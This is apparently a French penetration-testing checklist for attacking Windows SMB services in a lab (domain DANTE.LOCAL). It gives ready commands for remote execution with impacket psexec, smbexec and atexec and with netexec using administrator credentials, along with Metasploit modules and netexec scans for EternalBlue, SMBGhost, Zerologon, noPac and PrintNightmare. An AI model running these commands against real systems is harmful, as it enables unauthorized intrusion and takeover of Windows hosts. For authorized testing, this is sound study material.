
- [ ] [[#0. Enumérer les shares]]
- [ ] [[#1. Monter les shares]]
- [ ] [[#2. Bruteforce]]
- [ ] [[#3. RCE]]
- [ ] [[#4. Relay NetNTLM over SMB]]
- [ ] [[#5. CVEs]]




---
# 0. Enumérer les shares

[[3. Protocoles#SMB (139,445)]]


---

# 1. Monter les shares

[[COMMANDES WINDOWS#PARTAGES CMD]]

[[COMMANDES WINDOWS#PARTAGES POWERSHELL]]

[[COMMANDES LINUX#PARTAGES]]


---

# 2. Bruteforce


[[Bruteforce en ligne#SMB NXC]]



---

# 3. RCE

- PSEXEC -> Créer un named pipe (FIFO) et permet d'exécuter des processus
- SMBEXEC -> Similaire à PsExec mais instancie un serveur smb qui reçoit les commandes sur la cible
- ATEXEC -> Exécute des commandes au travers du task scheduler.


### Impacket

```shell
impacket-psexec administrator:'Password123!'@10.10.110.17
```

```shell
impacket-smbexec administrator:'Password123!'@10.10.110.17
```

```shell
impacket-atexec administrator:'Password123!'@10.10.110.17
```

### Metasploit

```msfconsole
use exploit/windows/smb/psexec
```

### [[NETEXEC#SMB NXC]]

```shell
nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```



---


# 4. Relay NetNTLM over SMB


[[LLMNR, NBT-NS Poisoning & SMB Relay - T1557.001#1. Relay NetNTLM over SMB]]




---

# 5. CVEs


https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities


Tester toutes les vuln connues (noPAC requiert des identifiants)

```bash
nxc smb 172.16.1.20 -u '' -p '' -d DANTE.LOCAL --dns-server 172.16.1.20 -M zerologon -M nopac -M printnightmare -M smbghost -M ms17-010 -M coerce_plus

```


## ETERNALBLUE (ms17-010)

Buffer Overflow

Potentiellement vulnérable si version d'avant 2017

NETEXEC

```
nxc smb <ip> -u '' -p '' -M ms17-010
```


METASPLOIT

```msfconsole
search exploit eternalblue
```




## SMBGhost (CVE-2020-0796)

Buffer Overflow

Potentiellement vulnérable si version d'avant 2020 (seulement Windows v1903-1909 x64
)

NETEXEC

```bash
nxc smb <ip> -u '' -p '' -M smbghost
```


METASPLOIT

```msfconsole
search exploit smbghost
```
